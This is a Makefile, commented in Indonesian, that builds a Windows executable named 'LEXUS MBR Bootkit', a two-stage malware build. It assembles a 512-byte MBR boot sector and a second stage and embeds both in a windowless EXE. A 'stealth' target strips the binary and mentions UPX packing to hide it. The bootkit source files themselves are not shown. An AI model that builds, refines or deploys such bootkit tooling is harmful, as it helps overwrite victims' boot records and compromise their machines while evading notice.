# Makefile untuk LEXUS MBR Bootkit (Two-Stage)
# Build di Linux, hasil EXE untuk Windows

# Compiler dan tools
NASM = nasm
CC = i686-w64-mingw32-gcc
CFLAGS = -m32 -Os -Wall -s
LDFLAGS = -m32 -s -static -Wl,--subsystem,windows
TARGET = lexus_mbr.exe

# File dependencies
BOOT_ASM = boot.asm
BOOT_BIN = boot.bin
BOOT_DATA_H = boot_data.h

STAGE2_ASM = stage2.asm
STAGE2_BIN = stage2.bin
STAGE2_DATA_H = stage2_data.h

MAIN_C = main.c

# Default target
all: $(TARGET)

# Step 1: Kompilasi boot.asm ke binary (Stage 1 - MBR)
$(BOOT_BIN): $(BOOT_ASM)
	$(NASM) -f bin -o $(BOOT_BIN) $(BOOT_ASM)

# Step 2: Kompilasi stage2.asm ke binary (Stage 2 - Extended)
$(STAGE2_BIN): $(STAGE2_ASM)
	$(NASM) -f bin -o $(STAGE2_BIN) $(STAGE2_ASM)

# Step 3: Konversi binary ke C header (Stage 1)
$(BOOT_DATA_H): $(BOOT_BIN)
	xxd -i $(BOOT_BIN) > $(BOOT_DATA_H)

# Step 4: Konversi binary ke C header (Stage 2)
$(STAGE2_DATA_H): $(STAGE2_BIN)
	xxd -i $(STAGE2_BIN) > $(STAGE2_DATA_H)

# Step 5: Kompilasi main.c dengan kedua bootloader embedded
$(TARGET): $(BOOT_DATA_H) $(STAGE2_DATA_H) $(MAIN_C)
	$(CC) $(CFLAGS) $(LDFLAGS) -o $(TARGET) $(MAIN_C)

# Versi debug (dengan console window)
debug: $(BOOT_DATA_H) $(STAGE2_DATA_H) $(MAIN_C)
	$(CC) -m32 -g -DDEBUG -o lexus_mbr_debug.exe $(MAIN_C)

# Versi stealth (tanpa console)
stealth: $(TARGET)
	strip $(TARGET)
	# Optional: compress with UPX
	# upx --best --lzma $(TARGET)

# Install dependencies di Linux
install-deps:
	sudo apt update
	sudo apt install -y nasm mingw-w64 xxd

# Clean build files
clean:
	rm -f $(TARGET) lexus_mbr_debug.exe
	rm -f $(BOOT_BIN) $(BOOT_DATA_H)
	rm -f $(STAGE2_BIN) $(STAGE2_DATA_H)
	rm -f *.o

# Test file hasil
test:
	@echo "=== Testing Executable ==="
	@file $(TARGET) 2>/dev/null || echo "File not built yet"
	@echo ""
	@echo "=== Bootloader Sizes ==="
	@if [ -f "$(BOOT_BIN)" ]; then \
		echo "Boot.bin (Stage1) size: $$(stat -c%s $(BOOT_BIN)) bytes"; \
		if [ $$(stat -c%s $(BOOT_BIN)) -eq 512 ]; then \
			echo "✓ Stage1 size correct (512 bytes)"; \
		else \
			echo "✗ Stage1 size incorrect"; \
		fi; \
	else \
		echo "Boot.bin not found"; \
	fi
	@if [ -f "$(STAGE2_BIN)" ]; then \
		echo "Stage2.bin size: $$(stat -c%s $(STAGE2_BIN)) bytes"; \
		SECTORS=$$(($$(stat -c%s $(STAGE2_BIN)) / 512)); \
		echo "  ($$SECTORS sektor)"; \
		if [ $$(( $$(stat -c%s $(STAGE2_BIN)) % 512 )) -eq 0 ]; then \
			echo "✓ Stage2 size is multiple of 512 bytes"; \
		else \
			echo "✗ Stage2 size not aligned to sector"; \
		fi; \
	else \
		echo "Stage2.bin not found"; \
	fi

# Build semua versi
all-versions: all debug stealth

# Quick build
quick: $(BOOT_BIN) $(STAGE2_BIN) $(BOOT_DATA_H) $(STAGE2_DATA_H) $(TARGET)

# Help
help:
	@echo "Targets available:"
	@echo "  all           - Build main executable (default)"
	@echo "  debug         - Build debug version with console"
	@echo "  stealth       - Build and strip executable"
	@echo "  install-deps  - Install build dependencies"
	@echo "  clean         - Remove all build files"
	@echo "  test          - Test the built executable"
	@echo "  all-versions  - Build all versions"
	@echo "  quick         - Quick build without cleanup"

.PHONY: all debug stealth install-deps clean test all-versions quick help
